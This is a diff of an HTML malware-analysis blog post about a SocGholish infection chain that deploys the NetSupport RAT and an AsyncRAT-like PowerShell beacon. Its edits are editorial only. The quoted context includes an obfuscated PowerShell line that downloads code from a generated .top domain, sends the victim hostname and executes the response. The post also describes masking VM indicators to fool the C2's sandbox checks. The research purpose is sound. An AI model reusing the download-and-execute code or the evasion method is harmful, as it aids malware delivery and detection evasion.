@@ -159,7 +159,7 @@ In this writeup, I will execute the payload and observe the response(s) from the
 <p>The C2 <em>will</em> perform checks to estimate whether their &ldquo;victim&rdquo; is a security researcher, so I&rsquo;ll have to make some adjustments in order to get a response.</p>
 <p>To quote from a fantastic <a href="https://www.proofpoint.com/us/blog/threat-insight/ta569-socgholish-and-beyond">article</a> from Proofpoint&rsquo;s Andrew Northern - &ldquo;SocGholish payloads are dynamically generated with data points about the victim being an input. This dynamic generation essentially locks each payload to each victim causing the payload to be rendered useless if it is moved to a different environment for analysis. Additionally, each payload is keyed to a specifically prefixed subdomain for command and control (C2) communication. Attempting to interact with a previously observed C2 domain with a known prefix will result in a closed connection.&rdquo;</p>
 <p>If the C2 detects that the victim is a VM, it will not respond to any requests from that IP again. Each failure means I&rsquo;ll need to use a new victim IP address and run through the whole infection chain starting with the compromised site to get a freshly generated payload.</p>
-<p><a href="https://infosec.exchange/@rmceoin/110289792904238153">Inspired once again</a> by <a href="https://infosec.exchange/@rmceoin">@rmceoin</a>, I created rules in BurpSuite to find and replace specific strings in the request body of traffic passing through the proxy.</p>
+<p>Inspired by this <a href="https://infosec.exchange/@rmceoin/110289792904238153">post</a> from <a href="https://infosec.exchange/@rmceoin">@rmceoin</a>, I created rules in BurpSuite to find and replace specific strings in the request body of traffic passing through the proxy.</p>
 <p>For example, the string <code>VirtualBox</code> would be replaced with <code>HP%20Z620%20Workstation</code>, <code>VBoxTray.exe</code> would be replaced with <code>svchost.exe</code>, and so on.</p>
 <p>In addition to these measures to obscure my VM from the threat actor, I also supplied a fake domain to replace the blank result returned by <code>activex_obj['ExpandEnvironmentStrings']('%userdnsdomain%')</code>. In a future post, I would like to explore the differences (if any) of the response returned by the C2 when given a domain versus no domain.</p>
 <p>After a few sessions of trial and error, I was finally able to obtain another response from the C2.</p>
@@ -230,7 +230,7 @@ In this writeup, I will execute the payload and observe the response(s) from the
 <p>The second base64 string is decoded and then piped to IEX - more PowerShell to explore.</p>
 <h3 id="nested-powershell">Nested PowerShell</h3>
 <p>The nested PowerShell has two primary purposes, which are seemingly unrelated to each other.</p>
-<p>One of these purposes is to extract and deploy the NetSupport RAT, which is commonly observed being deployed by SocGholish infrastructure. The specific PowerShell behavior has also been <a href="https://blogs.opentext.com/netsupport-remote-access-trojan-rat-delivered-through-fake-browser-updates-by-socgholish-threat-actors/">documented</a> by other researchers in the past.</p>
+<p>One of these purposes is to extract and deploy the NetSupport RAT, which is commonly observed being deployed by SocGholish infrastructure. The specific PowerShell behavior has also been <a href="https://blog.cyble.com/2022/09/21/netsupport-rat-distributed-via-socgholish/">documented</a> by other researchers in the past.</p>
 <p>The second purpose is to deploy a separate PowerShell C2 beacon. It is interesting to see two payloads being deployed by the same C2 server, although SocGholish is known to be an initial access broker.</p>
 <h3 id="nested-powershell-netsupport-rat">Nested PowerShell: NetSupport RAT</h3>
 <p>The first primary purpose of the nested PowerShell is to extract the contents of the <code>$zip_file</code> variable using <code>[IO.Compression.Zipfile]::ExtractToDirectory</code>.</p>
@@ -262,10 +262,10 @@ This zip file contains the NetSupport RAT binary as well as its dependencies.</p
 </span><span style="color:#e6db74">	$global:block=(New-Object $(&#39;</span>System.Net.WebClient<span style="color:#e6db74">&#39;) ).($(&#39;</span>DownloadString<span style="color:#e6db74">&#39;) )($(&#39;</span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#e6db74">&#39;) +$rand_str+$(.top/523/sdfzw.php?i=) +$(hostname));
 </span><span style="color:#e6db74">	rzs $global:block&#39;</span>
 -WindowStyle hidden
-</code></pre></div><p>As shown above, a request will be made to a pseudo-random <code>.top</code> domain, all with the same hardcoded path of <code>/523/sdfzw.php</code>, and the victim hostname passed as a parameter in the format <code>?i=&lt;hostname&gt;</code>.</p>
+</code></pre></div><p>As shown above, a request will be made to a DGA generated <code>.top</code> domain, all with the same hardcoded path of <code>/&lt;group_id&gt;/sdfzw.php</code>, and the victim hostname passed as a parameter in the format <code>?i=&lt;hostname&gt;</code>.</p>
 <p>The response from the <code>.top</code> domain will be saved to a global variable, <code>$global:block</code>, and then executed. We will explore this in the next section.</p>
 <h2 id="powershell-beacon---asyncrat">PowerShell Beacon - AsyncRAT</h2>
-<p>Note: I noticed the PowerShell beacon has striking similarities to <a href="https://securitynews.sonicwall.com/xmlpost/github-available-asyncrat-going-fileless/">AsyncRAT</a>, could be inspired by it.</p>
+<p>Note: I noticed the PowerShell beacon has striking similarities to <a href="https://securitynews.sonicwall.com/xmlpost/github-available-asyncrat-going-fileless/">AsyncRAT</a>, and could be inspired by it.</p>
 <p>The response from the <code>.top</code> domain was roughly 580KB of raw PowerShell, which, as we saw previously, is piped directly to IEX.</p>
 <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
     <a href="images/sdfzw_php_response.png"  itemprop="contentUrl"> 
